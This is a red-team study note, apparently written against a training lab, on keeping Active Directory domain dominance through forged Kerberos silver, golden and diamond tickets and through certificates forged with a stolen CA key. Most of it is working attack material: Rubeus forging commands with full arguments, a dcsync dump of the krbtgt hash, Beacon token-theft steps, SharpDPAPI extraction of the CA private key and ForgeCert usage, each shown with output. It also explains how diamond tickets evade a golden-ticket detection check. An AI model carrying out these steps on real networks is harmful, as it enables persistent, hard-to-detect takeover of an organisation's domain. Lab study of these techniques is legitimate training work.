---
description: 10/02/2025
---

# ✅ Domain Dominance

## Introduction

Once an attacker achieves a high-level of privilege within the Domain, such as Domain or Enterprise Admin, it is very difficult for a defending organization to recover or even consider the forest "clean" again.

Attackers with this kind of access can extract credentialed material from the domain and use it to re-obtain Domain Administrator level access at any time.

The majority of these credentials are never changed post compromise, practically granting unlimited access.

## Silver Tickets

<mark style="color:yellow;">A "silver ticket" is a forged service ticket signed using the secret material</mark> (<mark style="color:$success;">RC4/AES</mark> keys) of a <mark style="color:yellow;">computer account</mark>.&#x20;

<mark style="color:$success;">You may forge a TGS for any user to any service on that machine</mark>, which is incredibly useful for medium-to-short term persistence.

By default, computer passwords will change every 30 days.

* At this time, you will need to re-obtain the new secrets to continue making silver tickets

Both silver and golden tickets are forged, so _<mark style="color:$success;">**they can be generated on your own machine and imported into your Beacon session for usage across the domain**</mark>_.

**Dump Kerberos keys from Workstation 1 from a&#x20;**<mark style="color:yellow;">**`SYSTEM`**</mark>**&#x20;Beacon:**

```
Session           : Service from 0
User Name         : WKSTN-1$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 10/17/2023 10:31:24 AM
SID               : S-1-5-20

	 * Username : wkstn-1$
	 * Domain   : DEV.CYBERBOTIC.IO
	 * Password : (null)
	 * Key List :
	   des_cbc_md4       3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
```

**On the Windows attacking machine, use Rubeus to forge a service ticket for&#x20;**<mark style="color:yellow;">**`nlamb`**</mark>**&#x20;and the&#x20;**<mark style="color:yellow;">**`CIFS`**</mark>**&#x20;service:**

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : DEV.CYBERBOTIC.IO (DEV)
[*] SID            : S-1-5-21-569305411-121244042-2357301523
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : C9E598CD2A9B08FE31936F2C1846A8365D85147F75B8000CBC90E3C9DE50FCC7
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : C9E598CD2A9B08FE31936F2C1846A8365D85147F75B8000CBC90E3C9DE50FCC7
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : cifs
[*] Target         : wkstn-1.dev.cyberbotic.io

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'nlamb' to 'cifs/wkstn-1.dev.cyberbotic.io'

[*] AuthTime       : 9/9/2022 10:49:41 AM
[*] StartTime      : 9/9/2022 10:49:41 AM
[*] EndTime        : 9/9/2022 8:49:41 PM
[*] RenewTill      : 9/16/2022 10:49:41 AM

[*] base64(ticket.kirbi):

      doIFXD[...]MuaW8=
```

**Once we have that ticket, we can then import it into our Beacon for usage in the Domain:**

```
beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
[-] could not open \\wkstn-1.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass

[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5668
[+] Ticket successfully imported!
[+] LUID            : 0x423091

beacon> steal_token 5668
[+] Impersonated DEV\bfarmer

beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
[*] Listing: \\wkstn-1.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 08:17:30   $Recycle.Bin
          dir     08/15/2022 22:22:31   $WinREAgent
          dir     01/27/2022 18:18:49   Documents and Settings
          dir     12/07/2019 09:14:52   PerfLogs
          dir     08/22/2022 00:15:03   Program Files
          dir     10/06/2021 13:57:25   Program Files (x86)
          dir     09/08/2022 13:58:46   ProgramData
          dir     08/17/2022 17:52:54   Recovery
          dir     09/06/2022 08:17:28   System Volume Information
          dir     08/16/2022 08:15:58   Users
          dir     09/09/2022 10:38:50   Windows
 8kb      fil     09/09/2022 08:37:00   DumpStack.log.tmp
 796mb    fil     09/09/2022 08:37:00   hiberfil.sys
 704mb    fil     09/09/2022 08:37:00   pagefile.sys
 16mb     fil     09/09/2022 08:37:00   swapfile.sys
```

**Here are some useful ticket combinations:**

| **Technique**       | **Required Service Tickets** |
| ------------------- | ---------------------------- |
| `psexec`            | HOST & CIFS                  |
| `winrm`             | HOST & HTTP                  |
| `dcsync` (DCs only) | LDAP                         |

## Golden Tickets

<mark style="color:yellow;">**A "golden ticket" is a forged TGT that is signed by the domain's**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`krbtgt`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**account**</mark>.

<mark style="color:yellow;">Where a silver ticket can be used to impersonate any user</mark>, it's <mark style="color:$danger;">limited to either that single service or to any service but on a single machine</mark>.

<mark style="color:$success;">A golden ticket</mark>, however, <mark style="color:$success;">can be used to impersonate any user, to any service, on any machine in the domain — and to make things worse, the underlying credentials are never changed automatically</mark>.&#x20;

For that reason, the <mark style="color:green;">`krbtgt`</mark> <mark style="color:$success;">NTLM/AES hash</mark> is probably the **most powerful** secret you can obtain and is why it is used in <mark style="color:yellow;">`dcsync`</mark> examples so frequently!

### Common Method for Obtaining the `krbtgt` Hash

**We can use&#x20;**<mark style="color:yellow;">**`dcsync`**</mark>**&#x20;from the context of a Domain Admin:**

```
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda
```

**Once we receive our `krbtgt` hash, we can forge the ticket offline using Rubeus:**

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DEV.CYBERBOTIC.IO (DEV)
[*] SID            : S-1-5-21-569305411-121244042-2357301523
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 51D7F328ADE26E9F785FD7EEE191265EBC87C01A4790A7F38FB52E06563D4E7E
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : dev.cyberbotic.io

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'nlamb@dev.cyberbotic.io'

[*] AuthTime       : 9/9/2022 11:16:23 AM
[*] StartTime      : 9/9/2022 11:16:23 AM
[*] EndTime        : 9/9/2022 9:16:23 PM
[*] RenewTill      : 9/16/2022 11:16:23 AM

[*] base64(ticket.kirbi):

     doIFLz[...]MuaW8=
```

**Just like with the silver ticket, we can import it into a Beacon into a logon session to use throughout the Domain:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5060
[+] Ticket successfully imported!
[+] LUID            : 0x449047

beacon> steal_token 5060
beacon> run klist

#0>	Client: nlamb @ DEV.CYBERBOTIC.IO
	Server: krbtgt/dev.cyberbotic.io @ DEV.CYBERBOTIC.IO
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

beacon> ls \\dc-2.dev.cyberbotic.io\c$
[*] Listing: \\dc-2.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 10:51:51   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/05/2022 17:17:48   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/06/2022 15:21:25   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     09/05/2022 07:25:58   DumpStack.log
 12kb     fil     09/09/2022 09:36:12   DumpStack.log.tmp
 384mb    fil     09/09/2022 09:36:12   pagefile.sys
```

## Diamond Tickets

<mark style="color:yellow;">Like a golden ticket</mark>, <mark style="color:$success;">a diamond ticket is essentially a TGT which can be used to access any service as any user</mark>.&#x20;

A golden ticket is forged entirely offline, encrypted with the <mark style="color:yellow;">`krbtgt`</mark> hash of that domain, and then passed into a logon session for use.

Since <mark style="color:green;">Domain Controllers</mark> do not track TGTs, they have legitimately issued, they <mark style="color:$success;">will happily accept TGTs that are encrypted using its own</mark> <mark style="color:$success;"></mark><mark style="color:$success;">`krbtgt`</mark> <mark style="color:$success;"></mark><mark style="color:$success;">hash</mark>.

### Detecting Usage of Golden Tickets

One tactic to detect golden tickets is to look for `TGS-REQ`s taht have no corresponding `AS-REQ`.

### Crafting a Diamond Ticket

A diamond ticket is made by modifying the fields of a legitimate TGT that was issued by a DC.

**This is ultimately achieved by:**

1. Requesting a TGT
2. Decrypting it using the domain's <mark style="color:yellow;">`krbtgt`</mark> hash
3. Modifying the desired fields of the ticket
4. Then, re-encrypting it

Making it **undetectable using the tactic mentioned above**.

This _**ultimately overcomes the aforementioned shortcoming of a golden ticket**_ because any `TGS-REQ`s will have a preceding `AS-REQ`.

**Proving we have no access to the DC:**

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> ls \\dc-2.dev.cyberbotic.io\c$
[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

**Use Rubeus to create a Diamond Ticket:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```

**Syntax:**

* <mark style="color:yellow;">`/tgtdeleg`</mark> uses the Kerberos `GSS-API` to obtain a usable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
* <mark style="color:yellow;">`/ticketuser`</mark> is the username of the user to impersonate.
* <mark style="color:yellow;">`/ticketuserid`</mark> is the domain RID of that user.
* <mark style="color:yellow;">`/groups`</mark> are the desired group RIDs (`512` being Domain Admins).
* <mark style="color:yellow;">`/krbkey`</mark> is the `krbtgt` AES256 hash.

**Output:**

```
*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: +mzV4aOvQx3/dpZGBaVEhccq1t+jhKi8oeCYXkjHXw4=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFgz [...snip...] MuSU8=

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIFYj [...snip...] MuSU8=
```

**Rubeus'&#x20;**<mark style="color:yellow;">**`describe`**</mark>**&#x20;will now show that this is a TGT for the target user:**

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  7/7/2022 8:41:46 AM
  EndTime                  :  7/7/2022 6:41:46 PM
  RenewTill                :  1/1/1970 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  jp4k3G5LvXpIl3cuAnTtgLuxOWkPJIUjOEZB5wrHdVw=
```

## Forged Tickets

In larger organizations, the AD CS roles are installed on separate servers and not on the Domain Controllers themselves.

Often times, they are also not treated with the same sensitivity as DCs.

So, whereas only EAs and DAs can access/manage DCs, "lower level" roles such as server admins can access the CAs.

This can be perceived as an privilege escalation vector, but is just as powerful/useful as a domain persistence method.

Gaining local admin access to CA allows an attacker to extract the CA private key.

This can then be used to sign a forged certificate.

* Think of this like the `krbtgt` hash being able to sign a forged TGT

The default validity period for a CA private key is five years. However, it can be set to anything at setup.

### Extracting CA Private Keys

**Once on a CA,** [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) **can extract the private keys:**

```
beacon> run hostname
dc-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
```

<figure><img src="../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

Save the private key and certificate to a <mark style="color:yellow;">`.pem`</mark> file and convert it to a <mark style="color:yellow;">`.pfx`</mark> file using <mark style="color:yellow;">`openssl`</mark>.

Then, build the forged certificate with [`ForgeCert`](https://github.com/GhostPack/ForgeCert):

```
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
CA Certificate Information:
  Subject:        CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
  Issuer:         CN=ca, DC=cyberbotic, DC=io
  Start Date:     8/15/2022 4:06:13 PM
  End Date:       8/15/2024 4:16:13 PM
  Thumbprint:     697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E
  Serial:         13000000046EF818036CF8C99F000000000004

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: nlamb@cyberbotic.io
  Issuer:         CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
  Start Date:     10/5/2022 1:24:23 PM
  End Date:       10/5/2023 1:24:23 PM
  Thumbprint:     0CF404F5D1534854BA5EDEC5953ED7B7BE96C3A8
  Serial:         00978D5E506AE605589E43F21D17E56671

Done. Saved forged certificate to .\Desktop\fake.pfx with the password 'pass123'
```

Even though you can specify any `SubjectAltName`, the user does need to be present in AD.

**We can now use Rubeus to request a legitimate TGT with this forged certificate:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap
```

<mark style="color:yellow;">We're not limited to forging user certificates; we can do the same for machines</mark>.&#x20;

Combine this with the <mark style="color:yellow;">`S4U2self`</mark> trick to <mark style="color:$success;">gain access to any machine or service in the domain</mark>.
